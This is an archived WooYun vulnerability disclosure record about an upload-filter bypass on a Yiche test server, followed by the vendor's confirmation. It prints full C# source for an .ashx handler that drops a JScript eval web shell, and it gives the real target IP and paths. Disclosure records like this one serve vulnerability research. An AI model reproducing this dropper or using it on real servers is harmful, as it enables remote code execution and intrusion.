{"id": 28547, "wybug_id": "wooyun-2015-0111852", "wybug_title": "易车网某处未授权访问导致重要服务器绕过过滤shell海量内部信息泄漏可内网渗透", "wybug_corp": "易车", "wybug_author": "harbour_bin", "wybug_date": "2015-05-04 09:32", "wybug_open_date": "2015-06-18 10:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： 易车网某处未授权访问导致重要服务器绕过过滤shell  海量内部信息泄漏 可内网渗透 详细说明：  \n未授权访问:1、http://59.151.102.45/comment/All/Default.aspx2、http://59.151.102.45/ems/\n\n1、上传过滤了asp aspx 等后缀 但是ashx后缀没有过滤;2、上传Handler.ashx,代码如下,可用于验证:<%@ WebHandler Language=\"C#\" Class=\"Handler\" %>using System;using System.Web;using System.IO;public class Handler : IHttpHandler {        public void ProcessRequest (HttpContext context) {        context.Response.ContentType = \"text/plain\";        StreamWriter file = File.CreateText(context.Server.MapPath(\"wooyun.aspx\"));        file.Write(\"<%@ \");        file.Write(\"Page Language=\\\"Jscript\\\" %>\");        file.Write(\"<%eval(Request.Item[\\\"123456\\\"],\\\"unsafe\\\"); %>\");        file.Flush();        file.Close();    }     public bool IsReusable {        get {            return false;        }    }}3、得到wooyun.aspx文件,url:http://59.151.102.45/ems/uploadfiles/2015/5/wooyun.aspx4、获取服务器shell.\n   漏洞证明：  未授权访问\n\n\n\n上传位置\n\n服务器shell\n\n大量内部信息\n\n\n\n\n\n\n\n   修复方案：  你们更专业！   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-05-04 10:09 厂商回复： 非常感谢对易车的帮助，我们尽快处理，谢谢 最新状态： 2015-05-04：测试的站点，已经停用，谢谢对易车的支持  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}